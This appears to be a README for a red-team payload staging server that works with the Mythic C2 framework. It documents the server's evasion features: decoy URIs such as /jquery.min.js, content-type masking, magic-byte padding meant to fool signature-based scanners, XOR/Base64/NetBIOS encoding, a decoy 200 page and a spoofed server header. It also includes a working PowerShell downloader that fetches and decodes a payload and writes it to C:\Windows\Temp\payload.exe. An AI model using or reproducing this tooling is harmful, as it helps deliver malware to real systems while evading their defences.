# payload-server

Standalone file hosting server for red team payload staging. Designed to work alongside [mythic-payload-webapp](../mythic-payload-webapp).

Serves payloads with OPSEC controls: content-type masking, magic-byte padding, transform pipelines (XOR, Base64, NetBIOS), and filename override — all configurable per file.

---

## Ports

| Port | Role | Auth |
|------|------|------|
| `7082` | Management API + UI | Token (`X-Token` header) |
| `8443` | Public file serving | None |

---

## Quick Start

```bash
cp .env.example .env
# Edit .env — set MGMT_TOKEN
docker compose up -d
```

Open `http://localhost:7082` for the management UI.

---

## Environment Variables (`.env`)

| Variable | Default | Description |
|----------|---------|-------------|
| `MGMT_TOKEN` | — | **Required.** Token for the management API and UI |
| `MGMT_PORT` | `7082` | Management port |
| `SERVE_PORT` | `8443` | Public serving port |
| `BODY_404` | HTML page | HTML body returned for unknown URIs (with HTTP 200) |
| `SSL_CERT` | — | Path to PEM certificate (enables HTTPS on serving port) |
| `SSL_KEY` | — | Path to PEM private key |

---

## Features

- **Upload** a file at any URI (e.g. `/jquery.min.js`)
- **Overwrite** if same URI — resets download counter
- **Content-Type masking** — serve any file as any MIME type
- **Magic-byte padding** — prepend/append uses real format magic bytes (JPEG, PNG, PDF, ZIP…) + random fill
- **Content-Type Presets** — configurable per MIME type via the UI (🎨 Content-Type Presets tab)
- **Transform pipeline** — encode the payload before serving (XOR, Base64, NetBIOS…)
- **Filename override** — `Content-Disposition` with a decoy filename
- **Download counter** + last download timestamp per file
- **Delete** files from UI or API
- **Decoy 404** — returns configurable HTML with HTTP 200 for unknown URIs (no fingerprinting)
- **Server header spoof** — advertises `nginx/1.24.0`

---

## Content-Type Presets

The **🎨 Content-Type Presets** tab lets you configure magic bytes for each MIME type. When a file is served with `prepend_bytes > 0` or `append_bytes > 0`, the padding is built as:

```
prepend = magic_prepend[:N] + random_fill(N - len(magic_prepend))
append  = random_fill(N - len(magic_append)) + magic_append[-N:]
```

This makes padded files look like real format files to signature-based scanners.

### Default presets

| Content-Type | Prepend magic | Append magic | Random charset |
|---|---|---|---|
| `image/jpeg` | `FFD8FFE0...` (JFIF header) | `FFD9` (EOI) | binary |
| `image/png` | `89504E47 0D0A1A0A` | `...49454E44 AE426082` (IEND) | binary |
| `image/gif` | `474946383961` (GIF89a) | `3B` | binary |
| `application/pdf` | `%PDF-1.4\n` | `\n%%EOF\n` | binary |
| `application/zip` | `PK\x03\x04` | `PK\x05\x06` (EOCD) | binary |
| `application/javascript` | `/*! ` | `\n}();\n` (IIFE end) | printable |
| `text/html` | `<!DOCTYPE html>...<meta charset="UTF-8">` | `\n</body>\n</html>\n` | printable |
| `text/plain` | — | — | printable |

**Random charset:**
- `binary` — any byte (`os.urandom`)
- `printable` — printable ASCII (0x20–0x7e)
- `alphanum` — `[A-Za-z0-9]`

Presets are seeded automatically on first start. They can be created, edited, or deleted from the UI.

---

## Transform Pipeline

Transforms are applied **left to right** at serve time. The client must reverse the order to decode.

| Transform | Description |
|-----------|-------------|
| `xor` | XOR each byte with the configured key (0–255) |
| `base64` | Standard Base64 encode |
| `base64u` | URL-safe Base64, no padding (`=` stripped) |
| `netbios` | NetBIOS encode: each nibble → lowercase letter `a`–`p` |
| `netbiosu` | NetBIOS encode uppercase: each nibble → `A`–`P` |

Pipeline example: `xor,base64` → XOR the binary, then Base64-encode the result.
The client must Base64-decode, then XOR to recover the original binary.

### PowerShell decode example

```powershell
$Url       = "http://192.168.1.x:8443/jquery.min.js"
$XorKey    = 0x41
$Prepend   = 512   # downloader_prepend
$Append    = 256   # downloader_append
$Transform = "xor,base64"

$Raw = (New-Object Net.WebClient).DownloadData($Url)

# Strip padding
if ($Prepend -gt 0) { $Raw = $Raw[$Prepend..($Raw.Length - 1)] }
if ($Append  -gt 0) { $Raw = $Raw[0..($Raw.Length - 1 - $Append)] }

# Apply transforms in reverse
$Steps = ($Transform -split ',') | ForEach-Object { $_.Trim() }
[Array]::Reverse($Steps)
$Data = $Raw

foreach ($Step in $Steps) {
    switch ($Step) {
        "base64"   { $Data = [Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($Data)) }
        "base64u"  {
            $B64 = [Text.Encoding]::ASCII.GetString($Data) -replace '-','+' -replace '_','/'
            $Data = [Convert]::FromBase64String($B64 + '=' * ((4 - $B64.Length % 4) % 4))
        }
        "xor"      { $Data = $Data | ForEach-Object { $_ -bxor $XorKey } }
        "netbios"  {
            $Out = New-Object Collections.Generic.List[byte]
            for ($i = 0; $i -lt $Data.Length; $i += 2) {
                $Out.Add((($Data[$i] - [byte]'a') -shl 4) -bor ($Data[$i+1] - [byte]'a'))
            }
            $Data = $Out.ToArray()
        }
        "netbiosu" {
            $Out = New-Object Collections.Generic.List[byte]
            for ($i = 0; $i -lt $Data.Length; $i += 2) {
                $Out.Add((($Data[$i] - [byte]'A') -shl 4) -bor ($Data[$i+1] - [byte]'A'))
            }
            $Data = $Out.ToArray()
        }
    }
}

# $Data is now the raw payload binary
[IO.File]::WriteAllBytes("C:\Windows\Temp\payload.exe", $Data)
```

---

## Management API

All `/api/` endpoints require the `X-Token: <token>` header (except `/api/health`).

### Files

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/health` | Health check (no auth) |
| `GET` | `/api/files` | List all hosted files |
| `POST` | `/api/files` | Upload or overwrite a file |
| `DELETE` | `/api/files/{id}` | Delete a file |

### Upload (multipart/form-data)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `uri` | string | required | URI path, e.g. `/jquery.min.js` |
| `content_type` | string | `application/octet-stream` | HTTP Content-Type |
| `prepend_bytes` | int | `0` | Padding bytes prepended (uses magic bytes if preset exists) |
| `append_bytes` | int | `0` | Padding bytes appended (uses magic bytes if preset exists) |
| `dl_filename` | string | — | `Content-Disposition` filename |
| `transform` | string | — | Pipeline, e.g. `xor,base64` |
| `xor_key` | int | `65` (0x41) | XOR key (0–255) |
| `note` | string | — | Free-text label |
| `file` | file | required | The payload binary |

Uploading to an existing URI **overwrites** the file and resets the download counter.

### Content-Type Presets

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/presets` | List all presets |
| `POST` | `/api/presets` | Create a new preset |
| `PUT` | `/api/presets/{id}` | Update a preset |
| `DELETE` | `/api/presets/{id}` | Delete a preset |

---

## Integration with mythic-payload-webapp

Configure in mythic-payload-webapp **Settings**:
- **Payload Server URL**: `http://<host>:7082`
- **Payload Server Token**: value of `MGMT_TOKEN`

In a downloader stage, select `📦 payload-server` as the **C2 Profile** and set the special parameters:

| Parameter | Description |
|-----------|-------------|
| `downloader_contenttype` | Content-Type to serve (triggers matching preset) |
| `downloader_prepend` | Bytes before payload (magic bytes from preset + random fill) |
| `downloader_append` | Bytes after payload (random fill + magic bytes from preset) |
| `downloader_filename` | Decoy filename in Content-Disposition |
| `downloader_transform` | Transform pipeline, e.g. `xor,base64` |
| `downloader_xor_key` | XOR key (default `0x41`) |

> `Base URL` and `Profile URL` are the address injected into the payload (what the target contacts) — not the payload-server address.

---

## SSL (serving port)

Mount your certs and uncomment in `docker-compose.yml`:

```yaml
environment:
  SSL_CERT: /ssl/cert.pem
  SSL_KEY:  /ssl/key.pem
volumes:
  - ./ssl:/ssl:ro
  - payload_data:/data
```

---

## License

MIT
